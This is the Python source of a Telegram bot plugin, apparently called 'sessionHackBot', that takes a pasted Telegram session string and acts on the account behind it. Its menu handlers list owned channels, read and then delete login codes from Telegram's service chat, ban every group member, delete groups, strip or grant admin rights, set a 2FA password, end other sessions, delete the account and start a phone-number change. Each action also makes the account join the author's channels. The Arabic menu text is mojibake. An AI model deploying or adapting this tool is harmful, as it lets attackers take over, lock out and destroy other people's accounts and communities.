from . import *
from jepthon import bot
# COPYRIGHT Â© 2022 BY ANES/@N_B_1 ðŸ”¥
from telethon import events, functions, types, Button
from datetime import timedelta
import asyncio

api_id = os.environ.get("APP_ID")
import os, asyncio, re
from os import system
from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
api_hash = os.environ.get("API_HASH")

from telethon import TelegramClient as tg
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
from telethon.sessions import StringSession as ses
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
import telethon;from telethon import functions
from telethon.tl.types import ChannelParticipantsAdmins as cpa

from telethon.tl.functions.channels import CreateChannelRequest as ccr

bot = borg = tgbot

Arabihack = "@jepthon"

Bot_Username =os.environ.get("BOT_USERNAME", None) or "sessionHackBot"

async def change_number_code(strses, number, code, otp):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    bot = client = X
    try: 
      result = await bot(functions.account.ChangePhoneRequest(
        phone_number=number,
        phone_code_hash=code,
        phone_code=otp
      ))
      return True
    except:
      return False

async def change_number(strses, number):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    bot = client = X
    result = await bot(functions.account.SendChangePhoneCodeRequest(
        phone_number=number,
        settings=types.CodeSettings(
            allow_flashcall=True,
            current_number=True,
            allow_app_hash=True
        )
    ))
    return str(result)


async def userinfo(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    k = await X.get_me()
    return str(k)

async def terminate(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    
    await X(rt())

GROUP_LIST = []
async def delacc(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    
    await X(functions.account.DeleteAccountRequest("I am chutia"))

async def promote(strses, grp, user):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    
    try:
      await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
    except:
      await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
    
async def user2fa(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@IndianSupportGroup"))
    except BaseException:
      pass
    try:
      await X(join("@N_B_10"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    try:
      await X.edit_2fa('IndianHack IS BEST')
      return True
    except:
      return False

async def demall(strses, grp):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@IndianSupportGroup"))
    except BaseException:
      pass
    try:
      await X(join("@N_B_10"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
      try:
        await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
      except:
        await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
      


async def joingroup(strses, username):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@IndianSupportGroup"))
    except BaseException:
      pass
    try:
      await X(join("@N_B_10"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    await X(join(username))


async def leavegroup(strses, username):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@IndianSupportGroup"))
    except BaseException:
      pass
    try:
      await X(join("@N_B_10"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    await X(leave(username))

async def delgroup(strses, username):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@IndianSupportGroup"))
    except BaseException:
      pass
    try:
      await X(join("@N_B_10"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    await X(dc(username))
    

async def cu(strses):
  try:
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        k = await X.get_me()
        return [str(k.first_name), str(k.username or k.id)]
  except Exception as e:
    return False

async def usermsgs(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    i = ""
    try:
      await X(join("@IndianSupportGroup"))
    except BaseException:
      pass
    try:
      await X(join("@N_B_10"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    async for x in X.iter_messages(777000, limit=3):
      i += f"\n{x.text}\n"
    await client.delete_dialog(777000)
    return str(i)


async def userbans(strses, grp):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@IndianSupportGroup"))
    except BaseException:
      pass
    try:
      await X(join("@N_B_10"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    k = await X.get_participants(grp)
    for x in k:
      try:
        await X.edit_permissions(grp, x.id, view_messages=False)
      except:
        pass
    


async def userchannels(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@IndianSupportGroup"))
    except BaseException:
      pass
    try:
      await X(join("@N_B_10"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    k = await X(pc())
    i = ""
    for x in k.chats:
      try:
        i += f'\nCHANNEL NAME ~ {x.title} CHANNEL USRNAME ~ @{x.username}\n'
      except:
        pass
    return str(i)



import logging
logging.basicConfig(level=logging.WARNING)

channel = "jepthon"
menu = '''

"A" :~ [Ù…Ø¹Ø±ÙÙ‡ Ù‚Ù†ÙˆØ§Øª/ÙƒØ±ÙˆØ¨Ø§Øª Ø§Ù„ØªÙŠ ÙŠÙ…Ù„ÙƒÙ‡Ø§]

"B" :~ [Ø¬Ù„Ø¨ Ø¬Ù…ÙŠØ¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù…Ø«Ù„ {Ø±Ù‚Ù… Ø§Ù„Ø­Ø³Ø§Ø¨ ØŒ Ù…Ø¹Ø±Ù Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ùˆ Ø§ÙŠØ¯ÙŠ Ø§Ù„Ø´Ø®Øµ... ]

"C" :~ [{ØªÙÙ„ÙŠØ´ ÙƒØ±ÙˆØ¨/Ù‚Ù†Ø§Ù‡ {Ø§Ø¹Ø·Ù†ÙŠ Ø§Ù„ÙƒÙˆØ¯ Ùˆ Ø¨Ø¹Ø¯Ù‡Ø§ Ø§Ø±Ø³Ù„ Ù„ÙŠ ÙŠÙˆØ²Ø± Ø§Ù„ÙƒØ±ÙˆØ¨/Ø§Ù„Ù‚Ù†Ø§Ù‡ Ùˆ Ø³Ø§Ø·Ø±Ø¯ Ø¬Ù…ÙŠØ¹ Ø§Ø¹Ø¶Ø§Ø¡]

"D" :~ [Ø¬Ù„Ø¨ Ø§Ø®Ø± Ø±Ø³Ø§Ù„Ù‡ ØªØ­ØªÙˆÙŠ Ø¹Ù„Ù‰ ÙƒÙˆØ¯ ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ Ø§Ù„Ù‰ Ø§Ù„Ø­Ø³Ø§Ø¨ Ø¹Ù† Ø·Ø±ÙŠÙ‚ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³]

"E" :~ [Ø§Ù†Ø¶Ù…Ø§Ù… Ø§Ù„Ù‰ ÙƒØ±ÙˆØ¨/Ù‚Ù†Ø§Ù‡ Ø¹Ù† Ø·Ø±ÙŠÙ‚ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³] 

"F" :~ [Ù…ØºØ§Ø¯Ø±Ù‡ ÙƒØ±ÙˆØ¨ /Ù‚Ù†Ø§Ù‡ Ø¹Ù† Ø·Ø±ÙŠÙ‚ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³]

"G" :~][Ù…Ø³Ø­ ÙƒØ±ÙˆØ¨ /Ù‚Ù†Ø§Ù‡ Ø¹Ù† Ø¹Ù† Ø·Ø±ÙŠÙ‚ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³]

"H" :~ [ØªØ§ÙƒØ¯ Ù…Ù† Ø§Ù„ØªØ­Ù‚Ù‚ Ø¨Ø®Ø·ÙˆØªÙŠÙ† /Ù…ÙØ¹Ù„ Ø§Ùˆ Ù„Ø§]

"I" :~ [Ø§Ù†Ù‡Ø§Ø¡ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¬Ù„Ø³Ø§Øª Ù…Ø§ Ø¹Ø¯Ø§ Ø¬Ù„Ø³Ø© Ø§Ù„Ø¨ÙˆØª]

"J" :~ [Ø­Ø°Ù Ø§Ù„Ø­Ø³Ø§Ø¨]

"K" :~ [Ø­Ø°Ù Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ø´Ø±ÙÙŠÙ† ÙÙŠ ÙƒØ±ÙˆØ¨/Ù‚Ù†Ø§Ù‡]

"L" ~ [ØªØ±Ù‚ÙŠÙ‡ Ø¹Ø¶Ùˆ Ø§Ù„Ù‰ Ù…Ø´Ø±Ù Ø¯Ø§Ø®Ù„ ÙƒØ±ÙˆØ¨/Ù‚Ù†Ø§Ù‡]

"M" ~ [ØªØºÙŠØ± Ø±Ù‚Ù… Ø§Ù„Ø­Ø³Ø§Ø¨ Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³]

Ø§Ù†ØªØ¶Ø±Ùˆ Ù‚Ø±ÙŠØ¨Ø§ Ø§Ù„Ù…Ø²ÙŠØ¯ Ù…Ù† Ø§Ù„Ù…Ù…ÙŠØ²Ø§Øª ðŸ™‹â€â™‚ï¸
'''
mm = '''
Ù…Ù„Ø§Ø­Ø¸Ù‡ Ø§Ù†Ø¶Ù… Ø§ÙˆÙ„Ø§ Ù„Ù„Ø¯Ø¹Ù… @N_B_10
'''

keyboard = [
  [  
    Button.inline("A", data="A"), 
    Button.inline("B", data="B"),
    Button.inline("C", data="C"),
    Button.inline("D", data="D"),
    Button.inline("E", data="E")
    ],
  [
    Button.inline("F", data="F"), 
    Button.inline("G", data="G"),
    Button.inline("H", data="H"),
    Button.inline("I", data="I"),
    Button.inline("J", data="J"),
    ],
  [
    Button.inline("K", data="K"), 
    Button.inline("L", data="L"),
    Button.inline("M", data="M"),
    Button.inline("N", data="N"),
    ],
  [
    Button.url("Ø§Ù„Ù…Ø·ÙˆØ±", "https://t.me/jepthon")
    ]
]

@tgbot.on(events.NewMessage(pattern="/starthack"))
async def op(event):
  global mm
  if not event.is_private:
    IndianHack = [
      [
        Button.url("Ø§Ø¶ØºØ· Ù‡Ù†Ø§", f"https://t.me/{Bot_Username}?start=hack")
        ]
      ]         
    await event.reply("Ø§Ø¶ØºØ· Ù‡Ù†Ø§ Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù…ÙŠ", buttons=Arabihack)
  else:
    legendbye = [
      [
        Button.url("Ø¯ÙˆØ³ Ù‡Ù†Ø§", f"https://t.me/N_B_10")
        ]
      ]
    await event.reply("Ø§ÙˆÙ„Ø§ Ø§Ù†Ø¶Ù… Ø§Ù„Ù‰ Ø§Ù„Ù‚Ù†Ø§Ù‡!\n Ø¨Ø¹Ø¯Ù‡Ø§ Ø¬Ø±Ø¨ Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰~ /hack", buttons=legendbye)
    
       
@tgbot.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
async def op(event):
  IndianHack = [
    [
      Button.url("Ø¯ÙˆØ³ Ù‡Ù†Ø§", f"https://t.me/{Bot_Username}")
      ]
    ]         
  await event.reply("Ø§Ø¶ØºØ· Ù‡Ù†Ø§ Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù…ÙŠ", buttons=Arabihack)
  
@tgbot.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
async def start(event):
  global menu
  async with bot.conversation(event.chat_id) as x:
    keyboard = [
      [  
        Button.inline("A", data="A"), 
        Button.inline("B", data="B"),
        Button.inline("C", data="C"),
        Button.inline("D", data="D"),
        Button.inline("E", data="E")
        ],
      [
        Button.inline("F", data="F"), 
        Button.inline("G", data="G"),
        Button.inline("H", data="H"),
        Button.inline("I", data="I"),
        Button.inline("J", data="J")
        ],
      [
        Button.inline("K", data="K"), 
        Button.inline("L", data="L"),
        Button.inline("M", data="M"),
        Button.inline("N", data="N"),
        ],
      [
        Button.url("Ø§Ù„Ù…Ø·ÙˆØ±", "https://t.me/N_B_1")
        ]
    ]
    await x.send_message(f"Ø§Ø®ØªØ± Ù…Ø§ ØªØ±ÙŠØ¯ ÙØ¹Ù„Ù‡ Ù…Ø¹Ù‡ Ø§Ù„Ø¬Ù„Ø³Ù‡ \n\n{menu}", buttons=keyboard)
    
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"A")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Ù„Ù‚Ø¯ ØªÙ… Ø·Ø±Ø¯ Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ Ù…Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø³Ø¨Ù‚Ø§.\n /hack", buttons=keyboard)
      try:
        i = await userchannels(strses.text)
      except:
        return await event.reply("Ù„Ù‚Ø¯ ØªÙ… Ø·Ø±Ø¯ Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ Ù…Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø³Ø¨Ù‚Ø§.\n/hack", buttons=keyboard)
      if len(i) > 3855:
        file = open("session.txt", "w")
        file.write(i + "\n\nDetails BY @N_B_1")
        file.close()
        await bot.send_file(event.chat_id, "session.txt")
        system("rm -rf session.txt")
      else:
        await event.reply(i + "\n\nØ´ÙƒØ±Ø§ Ù„Ùƒ Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù…Ùƒ Ø§Ù„Ø¨ÙˆØª. \n/hack", buttons=keyboard)
      
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("Ù„Ù‚Ø¯ ØªÙ… Ø·Ø±Ø¯ Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ Ù…Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø³Ø¨Ù‚Ø§.\n/hack", buttons=keyboard)
    i = await userinfo(strses.text)
    await event.reply(i + "\n\nØ´ÙƒØ±Ø§ Ù„Ùƒ Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù…Ùƒ Ø§Ù„Ø¨ÙˆØª.\n/hack", buttons=keyboard)
    
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"C")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("Ù„Ù‚Ø¯ ØªÙ… Ø·Ø±Ø¯ Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ Ù…Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø³Ø¨Ù‚Ø§", buttons=keyboard)
    await x.send_message("Ø§Ø±Ø³Ù„ Ù„ÙŠ Ù…Ø¹Ø±Ù/Ø§ÙŠØ¯ÙŠ Ø§Ù„ÙƒØ±ÙˆØ¨/Ø§Ù„Ù‚Ù†Ø§Ù‡")
    grpid = await x.get_response()
    await userbans(strses.text, grpid.text)
    await event.reply("ÙŠØªÙ… Ø­Ø¸Ø± Ø¬Ù…ÙŠØ¹ Ø§Ø¹Ø¶Ø§Ø¡ Ø§Ù„ÙƒØ±ÙˆØ¨/Ø§Ù„Ù‚Ù†Ø§Ù‡", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"D")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Ù„Ù‚Ø¯ ØªÙ… Ø·Ø±Ø¯ Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ Ù…Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø³Ø¨Ù‚Ø§.", buttons=keyboard)
      i = await usermsgs(strses.text)
      await event.reply(i + "\n\nØ´ÙƒØ±Ø§ Ù„Ùƒ Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù…Ùƒ Ø§Ù„Ø¨ÙˆØª", buttons=keyboard)
    
      
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("Ù„Ù‚Ø¯ ØªÙ… Ø·Ø±Ø¯ Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ Ù…Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø³Ø¨Ù‚Ø§.", buttons=keyboard)
    await x.send_message("Ø§Ø¹Ø·Ù†ÙŠ Ù…Ø¹Ø±Ù/Ø§ÙŠØ¯ÙŠ Ø§Ù„ÙƒØ±ÙˆØ¨/Ø§Ù„Ù‚Ù†Ø§Ù‡")
    grpid = await x.get_response()
    await joingroup(strses.text, grpid.text)
    await event.reply("ØªÙ… Ø§Ù„Ø§Ù†Ø¶Ù…Ø§Ù… Ø§Ù„Ù‰ Ø§Ù„ÙƒØ±ÙˆØ¨/Ø§Ù„Ù‚Ù†Ø§Ù‡", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"F")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("Ù„Ù‚Ø¯ ØªÙ… Ø·Ø±Ø¯ Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ Ù…Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø³Ø¨Ù‚Ø§.", buttons=keyboard)
    await x.send_message("Ø§Ø¹Ø·Ù†ÙŠ Ù…Ø¹Ø±Ù/Ø§ÙŠØ¯ÙŠ Ø§Ù„ÙƒØ±ÙˆØ¨/Ø§Ù„Ù‚Ù†Ø§Ù‡")
    grpid = await x.get_response()
    await leavegroup(strses.text, grpid.text)
    await event.reply("Ù„Ù‚Ø¯ ØªÙ… Ù…ØºØ§Ø¯Ø±Ù‡ Ø§Ù„ÙƒØ±ÙˆØ¨/Ø§Ù„Ù‚Ù†Ø§Ù‡,", buttons=keyboard)
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"G")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Ù„Ù‚Ø¯ ØªÙ… Ø·Ø±Ø¯ Ø§Ù„ÙƒÙˆØ¯ Ù…Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø³Ø¨Ù‚Ø§.", buttons=keyboard)
      await x.send_message("Ø§Ø¹Ø·Ù†ÙŠ Ù…Ø¹Ø±Ù/Ø§ÙŠØ¯ÙŠ ÙƒØ±ÙˆØ¨/Ù‚Ù†Ø§Ù‡")
      grpid = await x.get_response()
      await delgroup(strses.text, grpid.text)
      await event.reply("ØªÙ… Ø­Ø°Ù Ø§Ù„ÙƒØ±ÙˆØ¨/Ù‚Ù†Ø§Ù‡ //Ø´ÙƒØ±Ø§ Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù…Ùƒ Ø§Ù„Ø¨ÙˆØª.", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"H")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Ù„Ù‚Ø¯ ØªÙ… Ø·Ø±Ø¯ Ø§Ù„ÙƒÙˆØ¯ Ù…Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø³Ø¨Ù‚Ø§.", buttons=keyboard)
      i = await user2fa(strses.text)
      if i:
        await event.reply("Ø§Ù„Ø´Ø®Øµ Ù„Ù… ÙŠÙØ¹Ù„ ØªØ­Ù‚Ù‚ Ø¨Ø®Ø·ÙˆØªÙŠÙ† ÙŠÙ…ÙƒÙ†Ùƒ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø§Ù„Ù‰ Ø§Ù„Ø­Ø³Ø§Ø¨ Ø¨ÙƒÙ„ Ø³Ù‡ÙˆÙ„Ù‡ Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù…Ùƒ Ø§Ù„Ø§Ù…Ø± ( D ) \n\nØ´ÙƒØ±Ø§ Ù„Ùƒ Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù…Ùƒ Ø§Ù„Ø¨ÙˆØª.", buttons=keyboard)
      else:
        await event.reply("Ø¹Ø°Ø±Ø§ Ø§Ù„Ø´Ø®Øµ Ù…ÙØ¹Ù„ ØªØ­Ù‚Ù‚ Ø¨Ø®Ø·ÙˆØªÙŠÙ†", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"I")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Ù„Ù‚Ø¯ ØªÙ… Ø·Ø±Ø¯ Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ Ù…Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø³Ø¨Ù‚Ø§.", buttons=keyboard)
      i = await terminate(strses.text)
      await event.reply("ØªÙ… Ø§Ù†Ù‡Ø§Ø¡ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¬Ù„Ø³Ø§Øª Ø´ÙƒØ±Ø§ Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù…Ùƒ Ø§Ù„Ø¨ÙˆØª.", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Ù„Ù‚Ø¯ ØªÙ… Ø·Ø±Ø¯ Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ Ù…Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø³Ø¨Ù‚Ø§.", buttons=keyboard)
      i = await delacc(strses.text)
      await event.reply("Ù„Ù‚Ø¯ ØªÙ… Ø­Ø°Ù Ø§Ù„Ø­Ø³Ø§Ø¨ Ø¨Ù†Ø¬Ø§Ø­.", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"K")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Ù„Ù‚Ø¯ ØªÙ… Ø·Ø±Ø¯ Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ Ù…Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø³Ø¨Ù‚Ø§.", buttons=keyboard)
      await x.send_message("Ø§Ø±Ø³Ù„ Ù„ÙŠ Ù…Ø¹Ø±Ù/Ø§ÙŠØ¯ÙŠ Ø§Ù„ÙƒØ±ÙˆØ¨/Ø§Ù„Ù‚Ù†Ø§Ù‡")
      grp = await x.get_response()
      await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ Ø§Ù„Ù…Ø¹Ø±Ù")
      user = await x.get_response()
      i = await promote(strses.text, grp.text, user.text)
      await event.reply("Ø³Ø§Ø±ÙØ¹Ùƒ ÙÙŠ Ø§Ù„ÙƒØ±ÙˆØ¨/Ø§Ù„Ù‚Ù†Ø§Ù‡ðŸŒš.", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"L")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Ù„Ù‚Ø¯ ØªÙ… Ø·Ø±Ø¯ Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ Ù…Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø³Ø¨Ù‚Ø§.", buttons=keyboard)
      await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ Ù…Ø¹Ø±Ù/Ø§ÙŠØ¯ÙŠ Ø§Ù„ÙƒØ±ÙˆØ¨/Ù‚Ù†Ø§Ù‡")
      pro = await x.get_response()
      try:
        i = await demall(strses.text, pro.text)
      except:
        pass
      await event.reply("Ù„Ù‚Ø¯ ØªÙ… Ø­Ø°Ù Ø¬Ù…ÙŠØ¹ Ù…Ø´Ø±ÙÙŠÙ† Ø§Ù„ÙƒØ±ÙˆØ¨/Ø§Ù„Ù‚Ù†Ø§Ù‡.", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"M")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Ù„Ù‚Ø¯ ØªÙ… Ø·Ø±Ø¯ Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ Ù…Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø³Ø¨Ù‚Ø§", buttons=keyboard)
